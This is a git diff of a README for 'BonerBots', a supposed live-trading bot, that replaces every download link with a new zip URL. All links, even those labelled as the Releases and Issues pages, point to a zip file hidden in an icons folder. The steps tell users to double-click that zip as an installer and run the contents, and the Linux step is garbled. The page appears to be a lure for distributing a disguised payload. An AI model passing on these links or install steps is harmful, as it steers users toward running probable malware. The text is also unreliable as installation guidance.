@@ -1,6 +1,6 @@
 # 🤖 BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0 - Livetrading Bots Made Easy
 
-[![Download](https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip)](https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip)
+[![Download](https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip)](https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,27 +18,27 @@ Before you dive in, ensure you have the following:
 
 To download BonerBots, visit the Releases page using the link below. 
 
-[Download BonerBots from Releases](https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip)
+[Download BonerBots from Releases](https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip)
 
 1. Click on the “Releases” link above.
 2. Look for the most recent version labeled “v1.0.”
 3. Choose the file that matches your operating system:
-   - For Windows: If you see `https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip`, click this link to download.
-   - For macOS: Look for the `https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip` file.
-   - For Linux: You may find a `https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip` package.
+   - For Windows: If you see `https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip`, click this link to download.
+   - For macOS: Look for the `https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip` file.
+   - For Linux: You may find a `https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip` package.
 4. Once the file is downloaded, locate it in your downloads folder.
 
 ### 🔧 Installation Steps
 
 #### For Windows:
 
-1. Double-click the downloaded `https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip`.
+1. Double-click the downloaded `https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip`.
 2. Follow the prompts in the installation wizard.
 3. Once installation is complete, click “Finish” to exit.
 
 #### For macOS:
 
-1. Open the downloaded `https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip`.
+1. Open the downloaded `https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip`.
 2. Drag and drop the application into your Applications folder.
 3. Open the app from the Applications folder.
 
@@ -46,7 +46,7 @@ To download BonerBots, visit the Releases page using the link below.
 
 1. Open a terminal window.
 2. Navigate to the downloaded directory using command `cd ~/Downloads`.
-3. Extract the files using `tar -xvzf https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip`.
+3. Extract the files using `tar -xvzf https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip`.
 4. Navigate to the extracted folder and run `./MyApp`.
 
 ## ⚙️ Configuration
@@ -81,8 +81,8 @@ Join our community to share experiences, tips, and enhancements. Find us on soci
 
 ## 🔗 Important Links
 
-- [Download BonerBots](https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/main/components/icons/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0_1.4-alpha.2.zip)
+- [Download BonerBots](https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip)
+- [GitHub Issues Page](https://github.com/Daimblerubina/BONERBOTS-OPEN-SOURCE-PUBLIC-v1.0/raw/refs/heads/main/components/icons/v-BONERBOT-SOURC-PUBLI-OPE-v1.5.zip)
 - [Community Forum](#)
 
 Thank you for choosing BonerBots! We hope you find our software useful for your trading needs.
